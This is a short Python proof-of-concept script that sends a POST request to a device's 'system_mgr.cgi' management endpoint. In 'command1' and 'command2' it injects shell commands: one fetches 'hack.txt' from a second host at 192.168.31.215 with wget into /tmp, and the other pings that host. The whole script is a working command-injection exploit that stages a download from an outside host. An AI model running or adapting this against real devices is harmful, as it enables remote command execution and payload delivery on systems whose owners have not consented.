import requests

url = "http://192.168.31.10/cgi-bin/system_mgr.cgi"

headers = {
}

data = {
    "cmd": "cgi_sms_test",
    "command1": "wget http://192.168.31.215:8000/hack.txt -O /tmp/hack.txt",
    "command2": "ping -c 4 192.168.31.215"

}

# wget http://192.168.31.215:8876/hack.txt

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

